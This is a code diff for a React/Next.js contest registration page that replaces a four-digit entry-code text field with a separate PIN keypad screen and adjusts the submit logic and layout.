@@ -6,6 +6,7 @@ import { useRouter } from 'next/router';
 import { useTranslation } from 'react-i18next';
 import axios from 'axios';
 import ErrorModal from '@/components/ErrorModal';
+import PinKeypad from '@/components/PinKeypad';
 import { useContest } from '@/context/ContestContext';
 
 export default function RegisterPage() {
@@ -16,19 +17,21 @@ export default function RegisterPage() {
   const [entryCode, setEntryCode] = useState('');
   const [loading, setLoading] = useState(false);
   const [showError, setShowError] = useState(false);
+  const [showPinPad, setShowPinPad] = useState(false);
 
   const handlePhoneChange = (e) => {
     const value = e.target.value.replace(/\D/g, '').slice(0, 8);
     setPhone(value);
   };
 
-  const handleCodeChange = (e) => {
-    const value = e.target.value.replace(/\D/g, '').slice(0, 4);
-    setEntryCode(value);
+  const handlePinChange = (newValue) => {
+    setEntryCode(newValue);
   };
 
   const handleSubmit = async (e) => {
     e.preventDefault();
+    if (phone.length < 8 || entryCode.length < 4) return;
+    
     setLoading(true);
 
     try {
@@ -47,6 +50,62 @@ export default function RegisterPage() {
     }
   };
 
+  // Show PIN keypad screen
+  if (showPinPad) {
+    return (
+      <>
+        <Head>
+          <title>MASRVI - {t('registration.password_label')}</title>
+        </Head>
+
+        <main className="min-h-screen flex flex-col bg-gray-50">
+          {/* Back Button */}
+          <div className="px-4 py-4">
+            <button
+              onClick={() => setShowPinPad(false)}
+              className="inline-flex items-center gap-2 text-gray-700 hover:text-primary-700 transition-colors text-base"
+            >
+              <span className="rtl:rotate-180">&#10094;</span>
+              <span>{t('registration.back')}</span>
+            </button>
+          </div>
+
+          <div className="flex-1 flex flex-col items-center justify-center px-4">
+            {/* PIN Keypad */}
+            <div className="w-full max-w-sm">
+              <PinKeypad
+                value={entryCode}
+                onChange={handlePinChange}
+                maxLength={4}
+                instruction={t('registration.enter_pin_instruction')}
+              />
+            </div>
+
+            {/* Submit button when PIN is complete */}
+            {entryCode.length === 4 && (
+              <button
+                onClick={handleSubmit}
+                disabled={loading}
+                className="mt-8 w-full max-w-xs py-4 bg-primary-500 hover:bg-primary-600 disabled:opacity-50 text-white font-bold rounded-2xl transition-all shadow-lg text-base"
+              >
+                {loading ? '...' : t('registration.submit')}
+              </button>
+            )}
+          </div>
+        </main>
+
+        <ErrorModal
+          isOpen={showError}
+          title={t('errors.title')}
+          message={t('errors.invalid_registration')}
+          buttonText={t('errors.retry')}
+          onClose={() => setShowError(false)}
+        />
+      </>
+    );
+  }
+
+  // Main registration form
   return (
     <>
       <Head>
@@ -80,7 +139,8 @@ export default function RegisterPage() {
                 <h1 className="text-xl md:text-2xl font-bold text-gray-900">{t('registration.submit')}</h1>
               </div>
 
-              <form onSubmit={handleSubmit} className="space-y-5 md:space-y-6">
+              <div className="space-y-5 md:space-y-6">
+                {/* Phone Input */}
                 <div>
                   <label htmlFor="phone" className="block text-sm font-medium text-gray-700 mb-2">
                     {t('registration.phone_label')}
@@ -102,32 +162,49 @@ export default function RegisterPage() {
                   </div>
                 </div>
 
+                {/* Password - Click to show PIN pad */}
                 <div>
-                  <label htmlFor="entryCode" className="block text-sm font-medium text-gray-700 mb-2">
+                  <label className="block text-sm font-medium text-gray-700 mb-2">
                     {t('registration.password_label')}
                   </label>
-                  <input
-                    id="entryCode"
-                    type="tel"
-                    inputMode="numeric"
-                    maxLength={4}
-                    value={entryCode}
-                    onChange={handleCodeChange}
-                    className="w-full px-4 py-3 md:py-4 glass-input rounded-xl focus:outline-none transition ltr-input text-base md:text-lg font-medium text-center tracking-widest"
-                    required
-                  />
+                  <button
+                    type="button"
+                    onClick={() => phone.length >= 8 && setShowPinPad(true)}
+                    disabled={phone.length < 8}
+                    className="w-full px-4 py-3 md:py-4 glass-input rounded-xl text-right flex items-center justify-between disabled:opacity-50 disabled:cursor-not-allowed"
+                  >
+                    <span className="flex gap-2">
+                      {entryCode ? (
+                        [...Array(4)].map((_, i) => (
+                          <span
+                            key={i}
+                            className={`w-3 h-3 rounded-full ${
+                              i < entryCode.length ? 'bg-primary-500' : 'bg-gray-300'
+                            }`}
+                          />
+                        ))
+                      ) : (
+                        <span className="text-gray-400 text-sm">{phone.length < 8 ? t('registration.enter_phone_first') : ''}</span>
+                      )}
+                    </span>
+                    <svg className="w-5 h-5 text-gray-400 rtl:rotate-180" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M9 5l7 7-7 7" />
+                    </svg>
+                  </button>
                 </div>
 
+                {/* Submit Button */}
                 <div className="pt-2 md:pt-4">
                   <button
-                    type="submit"
+                    type="button"
+                    onClick={handleSubmit}
                     disabled={loading || phone.length < 8 || entryCode.length < 4}
                     className="w-full py-4 md:py-5 bg-primary-500 hover:bg-primary-600 disabled:opacity-50 disabled:cursor-not-allowed text-white font-bold rounded-2xl transition-all shadow-lg text-base md:text-lg"
                   >
                     {loading ? '...' : t('registration.submit')}
                   </button>
                 </div>
-              </form>
+              </div>
             </div>
           </div>
         </div>
